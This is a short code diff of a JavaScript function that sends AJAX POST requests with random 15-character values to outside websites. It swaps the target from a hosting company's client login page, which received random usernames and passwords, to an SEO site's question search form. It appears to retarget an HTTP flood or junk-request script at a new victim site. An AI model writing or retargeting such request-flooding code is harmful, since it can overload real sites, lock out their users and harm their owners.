@@ -59,12 +59,11 @@ var code = {
 function kcc() {
 
   code.ajax({
-   url: "https://www.netmarlis.com.tr/clientarea.php",
+   url: "https://www.seohocasi.com/soru-cevap/",
    type: "POST",
    data: {
-         username : createrand(15),
-         password : createrand(15),
-		submit: 'Giriş'						
+         soruarama : createrand(15),
+		submit: 'Sorularda Ara'						
 		 
    },
    success: function (e) {
